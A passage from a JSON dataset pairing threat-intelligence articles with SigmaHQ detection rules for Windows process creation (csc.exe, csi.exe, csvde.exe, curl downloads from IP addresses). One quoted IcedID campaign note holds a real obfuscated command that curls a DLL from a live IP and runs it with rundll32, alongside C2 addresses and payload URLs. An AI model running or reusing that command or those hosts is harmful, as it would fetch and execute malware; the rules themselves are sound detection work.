          "ParentCommandLine|contains": "\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection"
        },
        "filter_optional_ansible": {
          "ParentCommandLine|contains": [
            "JwB7ACIAZgBhAGkAbABlAGQAIgA6AHQAcgB1AGUALAAiAG0AcwBnACIAOgAiAEEAbgBzAGkAYgBsAGUAIAByAGUAcQB1AGkAcgBlAHMAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAdgAzAC4AMAAgAG8AcgAgAG4AZQB3AGUAcgAiAH0AJw",
            "cAewAiAGYAYQBpAGwAZQBkACIAOgB0AHIAdQBlACwAIgBtAHMAZwAiADoAIgBBAG4AcwBpAGIAbABlACAAcgBlAHEAdQBpAHIAZQBzACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHYAMwAuADAAIABvAHIAIABuAGUAdwBlAHIAIgB9ACcA",
            "nAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnA"
          ]
        },
        "condition": "selection_img and 1 of selection_parent_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_csc_susp_parent.yml"
  },
  "121": {
    "url": "https://redcanary.com/blog/detecting-attacks-leveraging-the-net-framework/",
    "markdown": "# Detecting attacks leveraging the .NET Framework The .NET framework includes rich offensive capabilities that adversaries aren’t yet using, but we’ve been thinking about detection anyway. *Originally published January 22, 2020. Last modified April 30, 2024.* --- The .NET framework is increasingly being used for offensive purposes in the post-exploitation world. Unless you have the visibility into memory that some EDR solutions provide, detecting this activity can prove to be quite a challenge. Even with a solution that provides visibility into memory, sifting through large volumes of data and identifying what API calls are considered malicious can be a daunting",
    "sigma_rule": {
      "title": "Suspicious Use of CSharp Interactive Console",
      "id": "a9e416a8-e613-4f8b-88b8-a7d1d1af2f61",
      "status": "test",
      "description": "Detects the execution of CSharp interactive console by PowerShell",
      "references": [
        "https://redcanary.com/blog/detecting-attacks-leveraging-the-net-framework/"
      ],
      "author": "Michael R. (@nahamike01)",
      "date": "2020-03-08",
      "modified": "2022-07-14",
      "tags": [
        "attack.execution",
        "attack.t1127"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\csi.exe",
          "ParentImage|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\powershell_ise.exe"
          ],
          "OriginalFileName": "csi.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Possible depending on environment. Pair with other factors such as net connections, command-line args, etc."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_csi_use_of_csharp_console.yml"
  },
  "122": {
    "url": "https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms",
    "markdown": "",
    "sigma_rule": {
      "title": "Active Directory Structure Export Via Csvde.EXE",
      "id": "e5d36acd-acb4-4c6f-a13f-9eb203d50099",
      "status": "test",
      "description": "Detects the execution of \"csvde.exe\" in order to export organizational Active Directory structure.",
      "references": [
        "https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms",
        "https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf",
        "https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit",
        "https://redcanary.com/blog/msix-installers/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-03-14",
      "tags": [
        "attack.exfiltration",
        "attack.discovery",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\csvde.exe"
          },
          {
            "OriginalFileName": "csvde.exe"
          }
        ],
        "selection_remote": {
          "CommandLine|contains": " -f"
        },
        "filter_import": {
          "CommandLine|contains": " -i"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_csvde_export.yml"
  },
  "123": {
    "url": "https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Active Directory Structure Export Via Csvde.EXE",
      "id": "e5d36acd-acb4-4c6f-a13f-9eb203d50099",
      "status": "test",
      "description": "Detects the execution of \"csvde.exe\" in order to export organizational Active Directory structure.",
      "references": [
        "https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms",
        "https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf",
        "https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit",
        "https://redcanary.com/blog/msix-installers/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-03-14",
      "tags": [
        "attack.exfiltration",
        "attack.discovery",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\csvde.exe"
          },
          {
            "OriginalFileName": "csvde.exe"
          }
        ],
        "selection_remote": {
          "CommandLine|contains": " -f"
        },
        "filter_import": {
          "CommandLine|contains": " -i"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_csvde_export.yml"
  },
  "124": {
    "url": "https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit",
    "markdown": "",
    "sigma_rule": {
      "title": "Active Directory Structure Export Via Csvde.EXE",
      "id": "e5d36acd-acb4-4c6f-a13f-9eb203d50099",
      "status": "test",
      "description": "Detects the execution of \"csvde.exe\" in order to export organizational Active Directory structure.",
      "references": [
        "https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms",
        "https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf",
        "https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit",
        "https://redcanary.com/blog/msix-installers/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-03-14",
      "tags": [
        "attack.exfiltration",
        "attack.discovery",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\csvde.exe"
          },
          {
            "OriginalFileName": "csvde.exe"
          }
        ],
        "selection_remote": {
          "CommandLine|contains": " -f"
        },
        "filter_import": {
          "CommandLine|contains": " -i"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_csvde_export.yml"
  },
  "125": {
    "url": "https://redcanary.com/blog/msix-installers/",
    "markdown": "",
    "sigma_rule": {
      "title": "Active Directory Structure Export Via Csvde.EXE",
      "id": "e5d36acd-acb4-4c6f-a13f-9eb203d50099",
      "status": "test",
      "description": "Detects the execution of \"csvde.exe\" in order to export organizational Active Directory structure.",
      "references": [
        "https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms",
        "https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf",
        "https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit",
        "https://redcanary.com/blog/msix-installers/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-03-14",
      "tags": [
        "attack.exfiltration",
        "attack.discovery",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\csvde.exe"
          },
          {
            "OriginalFileName": "csvde.exe"
          }
        ],
        "selection_remote": {
          "CommandLine|contains": " -f"
        },
        "filter_import": {
          "CommandLine|contains": " -i"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_csvde_export.yml"
  },
  "126": {
    "url": "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
    "markdown": "# FIN7 tradecraft seen in attacks against Veeam backup servers 26 April 2023 ## Updates: 28-04-2023 1100 UTC - We have reviewed and updated this blogpost to reflect our latest findings: - We have added information regarding the file “445.ps1”, which was missing at the time of writing. - We have updated this blogpost to broaden our attribution from FIN7 to FIN7 or a threat actor utilizing FIN7 tradecraft. ## Introduction WithSecure Intelligence identified attacks which occurred in late March 2023 against internet-facing servers running Veeam Backup & Replication software. Our research indicates that the intrusion set used in these",
    "sigma_rule": {
      "title": "Curl Web Request With Potential Custom User-Agent",
      "id": "85de1f22-d189-44e4-8239-dc276b45379b",
      "status": "test",
      "description": "Detects execution of \"curl.exe\" with a potential custom \"User-Agent\". Attackers can leverage this to download or exfiltrate data via \"curl\" to a domain that only accept specific \"User-Agent\" strings",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-07-27",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\curl.exe"
          },
          {
            "OriginalFileName": "curl.exe"
          }
        ],
        "selection_header": {
          "CommandLine|re": "\\s-H\\s",
          "CommandLine|contains": "User-Agent:"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_curl_custom_user_agent.yml"
  },
  "127": {
    "url": "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
    "markdown": "# FIN7VEEAM Indicators of Compromise (IOCs) | Indicator type | Value | Note | | -------------- | ----- | ---- | | SHA1 | 8687b6b1508a93556d6e30d14e5c4ee9971f2d80 | POWERTRASH \"icsnd16_64refl.ps1\" sample | | SHA1 | b621f8c5e9033718b4e9d47a2f0eccb9783f612a | DUBLOADER \"libcurl.dll\" sample | | SHA1 | e5480a47172e3f75dbf0384f4ca82c7b47910e0f | POWERTRASH \"icbt11801_64refl.ps1\" sample | | IP | 217.12.206.176 | DICELOADER C2 | | IP | 162.248.225.115 | DICELOADER C2 | | IP | 45.136.199.128 | DICELOADER C2 | | IP | 91.149.243.181 | DICELOADER C2 | | IP | 91.199.147.152 | DICELOADER C2 | | IP | 95.217.49.123 | DICELOADER C2 | | IP | 77.75.230.112",
    "sigma_rule": {
      "title": "Curl Web Request With Potential Custom User-Agent",
      "id": "85de1f22-d189-44e4-8239-dc276b45379b",
      "status": "test",
      "description": "Detects execution of \"curl.exe\" with a potential custom \"User-Agent\". Attackers can leverage this to download or exfiltrate data via \"curl\" to a domain that only accept specific \"User-Agent\" strings",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-07-27",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\curl.exe"
          },
          {
            "OriginalFileName": "curl.exe"
          }
        ],
        "selection_header": {
          "CommandLine|re": "\\s-H\\s",
          "CommandLine|contains": "User-Agent:"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_curl_custom_user_agent.yml"
  },
  "128": {
    "url": "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
    "markdown": "# FIN7 tradecraft seen in attacks against Veeam backup servers 26 April 2023 ## Updates: 28-04-2023 1100 UTC - We have reviewed and updated this blogpost to reflect our latest findings: - We have added information regarding the file “445.ps1”, which was missing at the time of writing. - We have updated this blogpost to broaden our attribution from FIN7 to FIN7 or a threat actor utilizing FIN7 tradecraft. ## Introduction WithSecure Intelligence identified attacks which occurred in late March 2023 against internet-facing servers running Veeam Backup & Replication software. Our research indicates that the intrusion set used in these",
    "sigma_rule": {
      "title": "File Download From IP URL Via Curl.EXE",
      "id": "9cc85849-3b02-4cb5-b371-3a1ff54f2218",
      "related": [
        {
          "id": "5cb299fc-5fb1-4d07-b989-0644c68b6043",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects file downloads directly from IP address URL using curl.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://github.com/pr0xylife/IcedID/blob/8dd1e218460db4f750d955b4c65b2f918a1db906/icedID_09.28.2023.txt"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-10-18",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\curl.exe"
          },
          {
            "OriginalFileName": "curl.exe"
          }
        ],
        "selection_ip": {
          "CommandLine|re": "://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}"
        },
        "selection_http": {
          "CommandLine|contains": "http"
        },
        "selection_flag": {
          "CommandLine|contains": [
            " -O",
            "--remote-name",
            "--output"
          ]
        },
        "filter_main_ext": {
          "CommandLine|endswith": [
            ".bat",
            ".bat\"",
            ".dat",
            ".dat\"",
            ".dll",
            ".dll\"",
            ".exe",
            ".exe\"",
            ".gif",
            ".gif\"",
            ".hta",
            ".hta\"",
            ".jpeg",
            ".jpeg\"",
            ".log",
            ".log\"",
            ".msi",
            ".msi\"",
            ".png",
            ".png\"",
            ".ps1",
            ".ps1\"",
            ".psm1",
            ".psm1\"",
            ".vbe",
            ".vbe\"",
            ".vbs",
            ".vbs\"",
            ".bat'",
            ".dat'",
            ".dll'",
            ".exe'",
            ".gif'",
            ".hta'",
            ".jpeg'",
            ".log'",
            ".msi'",
            ".png'",
            ".ps1'",
            ".psm1'",
            ".vbe'",
            ".vbs'"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_curl_download_direct_ip_exec.yml"
  },
  "129": {
    "url": "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
    "markdown": "# FIN7VEEAM Indicators of Compromise (IOCs) | Indicator type | Value | Note | | -------------- | ----- | ---- | | SHA1 | 8687b6b1508a93556d6e30d14e5c4ee9971f2d80 | POWERTRASH \"icsnd16_64refl.ps1\" sample | | SHA1 | b621f8c5e9033718b4e9d47a2f0eccb9783f612a | DUBLOADER \"libcurl.dll\" sample | | SHA1 | e5480a47172e3f75dbf0384f4ca82c7b47910e0f | POWERTRASH \"icbt11801_64refl.ps1\" sample | | IP | 217.12.206.176 | DICELOADER C2 | | IP | 162.248.225.115 | DICELOADER C2 | | IP | 45.136.199.128 | DICELOADER C2 | | IP | 91.149.243.181 | DICELOADER C2 | | IP | 91.199.147.152 | DICELOADER C2 | | IP | 95.217.49.123 | DICELOADER C2 | | IP | 77.75.230.112",
    "sigma_rule": {
      "title": "File Download From IP URL Via Curl.EXE",
      "id": "9cc85849-3b02-4cb5-b371-3a1ff54f2218",
      "related": [
        {
          "id": "5cb299fc-5fb1-4d07-b989-0644c68b6043",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects file downloads directly from IP address URL using curl.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://github.com/pr0xylife/IcedID/blob/8dd1e218460db4f750d955b4c65b2f918a1db906/icedID_09.28.2023.txt"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-10-18",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\curl.exe"
          },
          {
            "OriginalFileName": "curl.exe"
          }
        ],
        "selection_ip": {
          "CommandLine|re": "://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}"
        },
        "selection_http": {
          "CommandLine|contains": "http"
        },
        "selection_flag": {
          "CommandLine|contains": [
            " -O",
            "--remote-name",
            "--output"
          ]
        },
        "filter_main_ext": {
          "CommandLine|endswith": [
            ".bat",
            ".bat\"",
            ".dat",
            ".dat\"",
            ".dll",
            ".dll\"",
            ".exe",
            ".exe\"",
            ".gif",
            ".gif\"",
            ".hta",
            ".hta\"",
            ".jpeg",
            ".jpeg\"",
            ".log",
            ".log\"",
            ".msi",
            ".msi\"",
            ".png",
            ".png\"",
            ".ps1",
            ".ps1\"",
            ".psm1",
            ".psm1\"",
            ".vbe",
            ".vbe\"",
            ".vbs",
            ".vbs\"",
            ".bat'",
            ".dat'",
            ".dll'",
            ".exe'",
            ".gif'",
            ".hta'",
            ".jpeg'",
            ".log'",
            ".msi'",
            ".png'",
            ".ps1'",
            ".psm1'",
            ".vbe'",
            ".vbs'"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_curl_download_direct_ip_exec.yml"
  },
  "130": {
    "url": "https://github.com/pr0xylife/IcedID/blob/8dd1e218460db4f750d955b4c65b2f918a1db906/icedID_09.28.2023.txt",
    "markdown": "# IcedID | 09.28.2023 | Campaign 163487289 | TA577 *************************************** **URL**: https://themarijuanashow.com/rt/ **ZIP**: 96183d3cd4307ff21793b4eaf54ee2c6c7e387e7c5d896f159d980eb1344301a **DLL**: 1f80003416d85564aa437e72de131702a3a413b4d60611bf412f92ee9cf1f7ee *************************************** ### Exec >> ``` cmd /c C:\\Users\\Admin\\AppData\\Local\\Temp\\4DH.pdf.lnk cmd.exe /c fbV3 || ecHO fbV3 & PiNG fbV3 || CurL http://155.138.164.116/RfOhPtl/3p -o C:\\Users\\Admin\\AppData\\Local\\Temp\\fbV3.log & PiNG -n 3 fbV3 || ruNdlL32 C:\\Users\\Admin\\AppData\\Local\\Temp\\fbV3.log scab /k pechene634 & ExIT 'dXTUfOTzKLJv ``` **System**: `C:\\Windows\\system32\\PING.EXE` **Ping Command**: ``` PiNG -n 3 fbV3 ``` **RunDLL Command**: ``` ruNdlL32 C:\\Users\\Admin\\AppData\\Local\\Temp\\fbV3.log scab /k pechene634 ``` *************************************** ### DLL Distribution - http://155.138.164.116/RfOhPtl/3p - http://155.138.223.115/eM19/Qs1 *************************************** ### C2 Downloader - http://carsfootyelo.com/ ***************************************",
    "sigma_rule": {
      "title": "File Download From IP URL Via Curl.EXE",
      "id": "9cc85849-3b02-4cb5-b371-3a1ff54f2218",
      "related": [
        {
          "id": "5cb299fc-5fb1-4d07-b989-0644c68b6043",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects file downloads directly from IP address URL using curl.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://github.com/pr0xylife/IcedID/blob/8dd1e218460db4f750d955b4c65b2f918a1db906/icedID_09.28.2023.txt"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-10-18",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\curl.exe"
          },
          {
            "OriginalFileName": "curl.exe"
          }
        ],
        "selection_ip": {
          "CommandLine|re": "://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}"
        },
        "selection_http": {
          "CommandLine|contains": "http"
        },
        "selection_flag": {
          "CommandLine|contains": [
            " -O",
            "--remote-name",
            "--output"
          ]
        },
        "filter_main_ext": {
          "CommandLine|endswith": [
            ".bat",
            ".bat\"",
            ".dat",
            ".dat\"",
            ".dll",
            ".dll\"",
            ".exe",
            ".exe\"",
            ".gif",
            ".gif\"",
            ".hta",
            ".hta\"",
            ".jpeg",
            ".jpeg\"",
            ".log",
            ".log\"",
            ".msi",
            ".msi\"",
            ".png",
            ".png\"",
            ".ps1",
            ".ps1\"",
            ".psm1",
            ".psm1\"",
            ".vbe",
            ".vbe\"",
            ".vbs",
            ".vbs\"",
            ".bat'",
            ".dat'",
            ".dll'",
            ".exe'",
            ".gif'",
            ".hta'",
            ".jpeg'",
            ".log'",
            ".msi'",
            ".png'",
            ".ps1'",
            ".psm1'",
            ".vbe'",
            ".vbs'"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_curl_download_direct_ip_exec.yml"
  },
  "131": {
    "url": "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
    "markdown": "# FIN7 tradecraft seen in attacks against Veeam backup servers 26 April 2023 ## Updates: 28-04-2023 1100 UTC - We have reviewed and updated this blogpost to reflect our latest findings: - We have added information regarding the file “445.ps1”, which was missing at the time of writing. - We have updated this blogpost to broaden our attribution from FIN7 to FIN7 or a threat actor utilizing FIN7 tradecraft. ## Introduction WithSecure Intelligence identified attacks which occurred in late March 2023 against internet-facing servers running Veeam Backup & Replication software. Our research indicates that the intrusion set used in these",
    "sigma_rule": {
      "title": "Suspicious File Download From IP Via Curl.EXE",
      "id": "5cb299fc-5fb1-4d07-b989-0644c68b6043",
      "status": "test",
      "description": "Detects potentially suspicious file downloads directly from IP addresses using curl.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://github.com/pr0xylife/IcedID/blob/8dd1e218460db4f750d955b4c65b2f918a1db906/icedID_09.28.2023.txt"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-07-27",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\curl.exe"
          },
          {
            "OriginalFileName": "curl.exe"
          }
        ],
        "selection_ip": {
          "CommandLine|re": "://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}"
        },
        "selection_http": {
          "CommandLine|contains": "http"
        },
        "selection_flag": {
          "CommandLine|contains": [
            " -O",
            "--remote-name",
            "--output"
          ]
        },
        "selection_ext": {
          "CommandLine|endswith": [
            ".bat",
            ".bat\"",
            ".dat",
            ".dat\"",
            ".dll",
            ".dll\"",
            ".exe",
            ".exe\"",
            ".gif",
            ".gif\"",
            ".hta",
            ".hta\"",
            ".jpeg",
            ".jpeg\"",
            ".log",
            ".log\"",
            ".msi",
            ".msi\"",
            ".png",
            ".png\"",
            ".ps1",
            ".ps1\"",
            ".psm1",
            ".psm1\"",
            ".vbe",
            ".vbe\"",
            ".vbs",
            ".vbs\"",
            ".bat'",
            ".dat'",
            ".dll'",
            ".exe'",
            ".gif'",
            ".hta'",
            ".jpeg'",
            ".log'",
            ".msi'",
            ".png'",
            ".ps1'",
            ".psm1'",
            ".vbe'",
            ".vbs'"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_curl_download_direct_ip_susp_extensions.yml"
  },
  "132": {
    "url": "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
    "markdown": "# FIN7VEEAM Indicators of Compromise (IOCs) | Indicator type | Value | Note | | -------------- | ----- | ---- | | SHA1 | 8687b6b1508a93556d6e30d14e5c4ee9971f2d80 | POWERTRASH \"icsnd16_64refl.ps1\" sample | | SHA1 | b621f8c5e9033718b4e9d47a2f0eccb9783f612a | DUBLOADER \"libcurl.dll\" sample | | SHA1 | e5480a47172e3f75dbf0384f4ca82c7b47910e0f | POWERTRASH \"icbt11801_64refl.ps1\" sample | | IP | 217.12.206.176 | DICELOADER C2 | | IP | 162.248.225.115 | DICELOADER C2 | | IP | 45.136.199.128 | DICELOADER C2 | | IP | 91.149.243.181 | DICELOADER C2 | | IP | 91.199.147.152 | DICELOADER C2 | | IP | 95.217.49.123 | DICELOADER C2 | | IP | 77.75.230.112",
    "sigma_rule": {
      "title": "Suspicious File Download From IP Via Curl.EXE",
      "id": "5cb299fc-5fb1-4d07-b989-0644c68b6043",
      "status": "test",
      "description": "Detects potentially suspicious file downloads directly from IP addresses using curl.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://github.com/pr0xylife/IcedID/blob/8dd1e218460db4f750d955b4c65b2f918a1db906/icedID_09.28.2023.txt"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-07-27",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\curl.exe"
          },
          {
            "OriginalFileName": "curl.exe"
          }
        ],
        "selection_ip": {
          "CommandLine|re": "://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}"
        },
        "selection_http": {
          "CommandLine|contains": "http"
        },
        "selection_flag": {
          "CommandLine|contains": [
            " -O",
            "--remote-name",
            "--output"
          ]
        },
        "selection_ext": {
          "CommandLine|endswith": [
            ".bat",
            ".bat\"",
            ".dat",
            ".dat\"",
            ".dll",
            ".dll\"",
            ".exe",
            ".exe\"",
            ".gif",
            ".gif\"",
            ".hta",
            ".hta\"",
            ".jpeg",
            ".jpeg\"",
            ".log",
            ".log\"",
            ".msi",
            ".msi\"",
            ".png",
            ".png\"",
            ".ps1",
            ".ps1\"",
            ".psm1",
            ".psm1\"",
            ".vbe",
            ".vbe\"",
            ".vbs",
            ".vbs\"",
            ".bat'",
            ".dat'",
            ".dll'",
            ".exe'",
            ".gif'",
            ".hta'",
            ".jpeg'",
            ".log'",
            ".msi'",
            ".png'",
            ".ps1'",
            ".psm1'",
            ".vbe'",
            ".vbs'"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_curl_download_direct_ip_susp_extensions.yml"
  },
  "133": {
    "url": "https://github.com/pr0xylife/IcedID/blob/8dd1e218460db4f750d955b4c65b2f918a1db906/icedID_09.28.2023.txt",
